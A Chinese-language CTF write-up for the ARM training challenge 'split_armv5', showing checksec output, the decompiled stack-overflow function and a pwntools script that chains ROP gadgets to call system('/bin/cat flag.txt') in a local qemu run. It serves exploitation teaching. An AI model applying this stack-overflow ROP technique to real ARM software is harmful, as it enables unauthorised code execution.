---
title: split_armv5
date: 2023-03-23 17:44:05
categories: 
- pwn_wp
tags: 
- pwn
- arm
- ROP

---

arm pwn入门题，arm下的简单ROP。
<!-- more -->

查壳：

同样是32位动态链接，只开了NX。

```sh
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/split_armv5/split_armv5'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

逆向：

同样是pwnme里有栈溢出：

```c
int pwnme()
{
  char s[36]; // [sp+0h] [bp-24h] BYREF

  memset(s, 0, 0x20u);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, s, 0x60u);
  return puts("Thank you!");
}
```

留了个`system`和`/bin/cat flag.txt`，因此只要覆盖`LR`执行`system("/bin/cat flag.txt")`即可。

就是找不到`pop r0`，找了个`pop r3`，之后`mov r0,r3`来控制`r0`

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='split_armv5'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
p=process(["qemu-arm","-L","/usr/arm-linux-gnueabi/", "./"+filename])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    

bincat_addr=0x0002103C
sys_addr=0x000105E0
pop_r3_pc=0x000103a4
mov_r0_r3_pop_fp_pc=0x00010558

r()
payload=b'a'*0x24+p32(pop_r3_pc)+p32(bincat_addr)+p32(mov_r0_r3_pop_fp_pc)+p32(sys_addr)*2
s(payload)

itr()

```

